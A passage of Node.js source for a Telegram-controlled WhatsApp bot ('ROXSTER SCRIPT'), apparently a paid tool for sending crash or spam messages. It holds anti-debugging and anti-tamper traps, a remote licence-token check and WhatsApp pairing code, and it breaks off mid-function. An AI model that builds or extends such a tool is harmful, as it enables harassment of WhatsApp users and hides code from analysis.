const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const checkOwner = (ctx, next) => {
  const userId = ctx.from.id.toString(); 
  if (!ownerID.includes(userId)) {
    return ctx.reply("❗Mohon Maaf Fitur Ini Khusus Owner");
  }

  return next();
};
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = 'https://raw.githubusercontent.com/animationarmufa-oss/Databasetoken/refs/heads/main/token.json';
const thumbnailUrl = "https://files.catbox.moe/g3ehq6.jpg";
const bugurlpp = "https://files.catbox.moe/braq7f.jpg";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⣠⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡄⠀⣠⣴⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⠂⠘⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠁⠀⠀⠈⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡀⠀⠀⠀⠀⣰⣿⡟⠁⠀⠀⠀⠀⠈⢻⣿⣆⠀⠀⠀⠀⢀⠀⠀⠀⠀
⠀⠀⣠⡾⣿⣦⡀⠀⢰⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡆⠀⢀⣴⣿⢷⣄⠀⠀
⠀⠘⠋⣠⢿⣿⠏⢠⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⡄⠹⣿⡿⣄⠙⠃⠀
⠀⠀⠀⠁⠴⠋⢠⣿⠏⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⠹⣿⡄⠙⠦⠈⠁⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠃⠐⢻⣿⣦⡀⠀⠀⠀⠀⢀⣴⣿⡟⠂⠘⢿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡟⠀⠀⠴⠋⣻⡿⣿⣦⡀⢀⣴⣿⢿⣟⠙⠦⠀⠀⢻⡄⠀⠀⠀⠀
⠀⠀⠀⢀⠏⠀⠀⠀⠀⠘⠋⣴⢿⣿⣿⣿⣿⡿⣦⠙⠃⠀⠀⡀⠀⠹⡀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠁⠴⠋⣨⣅⠙⠦⠈⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#- ＲＯＸＳＴＥＲ ＳＣＲＩＰＴ

╰➤ INFORMATION:
 ▢ Developer: @Fuckyatim
 ▢ Version: 2.0 Beta
 ▢ Status: Bot Connected
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⣠⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡄⠀⣠⣴⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⠂⠘⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠁⠀⠀⠈⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡀⠀⠀⠀⠀⣰⣿⡟⠁⠀⠀⠀⠀⠈⢻⣿⣆⠀⠀⠀⠀⢀⠀⠀⠀⠀
⠀⠀⣠⡾⣿⣦⡀⠀⢰⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡆⠀⢀⣴⣿⢷⣄⠀⠀
⠀⠘⠋⣠⢿⣿⠏⢠⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⡄⠹⣿⡿⣄⠙⠃⠀
⠀⠀⠀⠁⠴⠋⢠⣿⠏⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⠹⣿⡄⠙⠦⠈⠁⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠃⠐⢻⣿⣦⡀⠀⠀⠀⠀⢀⣴⣿⡟⠂⠘⢿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡟⠀⠀⠴⠋⣻⡿⣿⣦⡀⢀⣴⣿⢿⣟⠙⠦⠀⠀⢻⡄⠀⠀⠀⠀
⠀⠀⠀⢀⠏⠀⠀⠀⠀⠘⠋⣴⢿⣿⣿⣿⣿⡿⣦⠙⠃⠀⠀⡀⠀⠹⡀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠁⠴⠋⣨⣅⠙⠦⠈⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#- ＲＯＸＳＴＥＲ ＳＣＲＩＰＴ

╰➤ INFORMATION:
 ▢ Developer: @Fuckyatim
 ▢ Version: 2.0 Beta
 ▢ Status: No Access
  
  Perubahan kode terdeteksi, Harap membeli script kepada reseller
  yang tersedia dan legal
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⣠⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡄⠀⣠⣴⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⠂⠘⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠁⠀⠀⠈⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡀⠀⠀⠀⠀⣰⣿⡟⠁⠀⠀⠀⠀⠈⢻⣿⣆⠀⠀⠀⠀⢀⠀⠀⠀⠀
⠀⠀⣠⡾⣿⣦⡀⠀⢰⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡆⠀⢀⣴⣿⢷⣄⠀⠀
⠀⠘⠋⣠⢿⣿⠏⢠⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⡄⠹⣿⡿⣄⠙⠃⠀
⠀⠀⠀⠁⠴⠋⢠⣿⠏⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⠹⣿⡄⠙⠦⠈⠁⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠃⠐⢻⣿⣦⡀⠀⠀⠀⠀⢀⣴⣿⡟⠂⠘⢿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡟⠀⠀⠴⠋⣻⡿⣿⣦⡀⢀⣴⣿⢿⣟⠙⠦⠀⠀⢻⡄⠀⠀⠀⠀
⠀⠀⠀⢀⠏⠀⠀⠀⠀⠘⠋⣴⢿⣿⣿⣿⣿⡿⣦⠙⠃⠀⠀⡀⠀⠹⡀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠁⠴⠋⣨⣅⠙⠦⠈⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

#- ＲＯＸＳＴＥＲ ＳＣＲＩＰＴ

╰➤ INFORMATION:
 ▢ Developer: @Fuckyatim
 ▢ Version: 2.0 Beta
 ▢ Status: No Access
  
  Perubahan kode terdeteksi, Harap membeli script kepada reseller
  yang tersedia dan legal
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⣠⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡄⠀⣠⣴⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⠂⠘⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠁⠀⠀⠈⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡀⠀⠀⠀⠀⣰⣿⡟⠁⠀⠀⠀⠀⠈⢻⣿⣆⠀⠀⠀⠀⢀⠀⠀⠀⠀
⠀⠀⣠⡾⣿⣦⡀⠀⢰⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡆⠀⢀⣴⣿⢷⣄⠀⠀
⠀⠘⠋⣠⢿⣿⠏⢠⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⡄⠹⣿⡿⣄⠙⠃⠀
⠀⠀⠀⠁⠴⠋⢠⣿⠏⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⠹⣿⡄⠙⠦⠈⠁⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠃⠐⢻⣿⣦⡀⠀⠀⠀⠀⢀⣴⣿⡟⠂⠘⢿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡟⠀⠀⠴⠋⣻⡿⣿⣦⡀⢀⣴⣿⢿⣟⠙⠦⠀⠀⢻⡄⠀⠀⠀⠀
⠀⠀⠀⢀⠏⠀⠀⠀⠀⠘⠋⣴⢿⣿⣿⣿⣿⡿⣦⠙⠃⠀⠀⡀⠀⠹⡀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠁⠴⠋⣨⣅⠙⠦⠈⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

#- ＲＯＸＳＴＥＲ ＳＣＲＩＰＴ

╰➤ INFORMATION:
 ▢ Developer: @Fuckyatim
 ▢ Version: 2.0 Beta
 ▢ Status: No Access
  
  Token tidak terdaftar, Mohon membeli akses kepada reseller yang tersedia
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⣠⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡄⠀⣠⣴⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⠂⠘⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠁⠀⠀⠈⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡀⠀⠀⠀⠀⣰⣿⡟⠁⠀⠀⠀⠀⠈⢻⣿⣆⠀⠀⠀⠀⢀⠀⠀⠀⠀
⠀⠀⣠⡾⣿⣦⡀⠀⢰⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡆⠀⢀⣴⣿⢷⣄⠀⠀
⠀⠘⠋⣠⢿⣿⠏⢠⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⡄⠹⣿⡿⣄⠙⠃⠀
⠀⠀⠀⠁⠴⠋⢠⣿⠏⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⠹⣿⡄⠙⠦⠈⠁⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠃⠐⢻⣿⣦⡀⠀⠀⠀⠀⢀⣴⣿⡟⠂⠘⢿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡟⠀⠀⠴⠋⣻⡿⣿⣦⡀⢀⣴⣿⢿⣟⠙⠦⠀⠀⢻⡄⠀⠀⠀⠀
⠀⠀⠀⢀⠏⠀⠀⠀⠀⠘⠋⣴⢿⣿⣿⣿⣿⡿⣦⠙⠃⠀⠀⡀⠀⠹⡀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠁⠴⠋⣨⣅⠙⠦⠈⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

#- ＲＯＸＳＴＥＲ ＳＣＲＩＰＴ

╰➤ INFORMATION:
 ▢ Developer: @Fuckyatim
 ▢ Version: 2.0 Beta
 ▢ Status: No Access
  
  Gagal menghubungkan ke server, Akses ditolak
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⣠⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡄⠀⣠⣴⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⠂⠘⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠁⠀⠀⠈⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡀⠀⠀⠀⠀⣰⣿⡟⠁⠀⠀⠀⠀⠈⢻⣿⣆⠀⠀⠀⠀⢀⠀⠀⠀⠀
⠀⠀⣠⡾⣿⣦⡀⠀⢰⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡆⠀⢀⣴⣿⢷⣄⠀⠀
⠀⠘⠋⣠⢿⣿⠏⢠⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⡄⠹⣿⡿⣄⠙⠃⠀
⠀⠀⠀⠁⠴⠋⢠⣿⠏⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⠹⣿⡄⠙⠦⠈⠁⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠃⠐⢻⣿⣦⡀⠀⠀⠀⠀⢀⣴⣿⡟⠂⠘⢿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡟⠀⠀⠴⠋⣻⡿⣿⣦⡀⢀⣴⣿⢿⣟⠙⠦⠀⠀⢻⡄⠀⠀⠀⠀
⠀⠀⠀⢀⠏⠀⠀⠀⠀⠘⠋⣴⢿⣿⣿⣿⣿⡿⣦⠙⠃⠀⠀⡀⠀⠹⡀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠁⠴⠋⣨⣅⠙⠦⠈⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#- ＲＯＸＳＴＥＲ ＳＣＲＩＰＴ

╰➤ INFORMATION:
 ▢ Developer: @Fuckyatim
 ▢ Version: 2.0 Beta
 ▢ Status: Bot Connected
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Netrality',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `<blockquote>
#- ＲＯＸＳＴＥＲ ＳＣＲＩＰＴ

▢ Number: ${lastPairingMessage.phoneNumber}
▢ Pairing Code: ${lastPairingMessage.pairingCode}
▢ Type: Connected
</blockquote>`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⣠⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡄⠀⣠⣴⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⠂⠘⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠁⠀⠀⠈⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡀⠀⠀⠀⠀⣰⣿⡟⠁⠀⠀⠀⠀⠈⢻⣿⣆⠀⠀⠀⠀⢀⠀⠀⠀⠀
⠀⠀⣠⡾⣿⣦⡀⠀⢰⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡆⠀⢀⣴⣿⢷⣄⠀⠀
⠀⠘⠋⣠⢿⣿⠏⢠⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⡄⠹⣿⡿⣄⠙⠃⠀
⠀⠀⠀⠁⠴⠋⢠⣿⠏⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⠹⣿⡄⠙⠦⠈⠁⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠃⠐⢻⣿⣦⡀⠀⠀⠀⠀⢀⣴⣿⡟⠂⠘⢿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡟⠀⠀⠴⠋⣻⡿⣿⣦⡀⢀⣴⣿⢿⣟⠙⠦⠀⠀⢻⡄⠀⠀⠀⠀
⠀⠀⠀⢀⠏⠀⠀⠀⠀⠘⠋⣴⢿⣿⣿⣿⣿⡿⣦⠙⠃⠀⠀⡀⠀⠹⡀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠁⠴⠋⣨⣅⠙⠦⠈⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

#- ＲＯＸＳＴＥＲ ＳＣＲＩＰＴ

╰➤ INFORMATION:
 ▢ Developer: @Fuckyatim
 ▢ Version: 2.0 Beta
 ▢ Status: Sender Connected
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
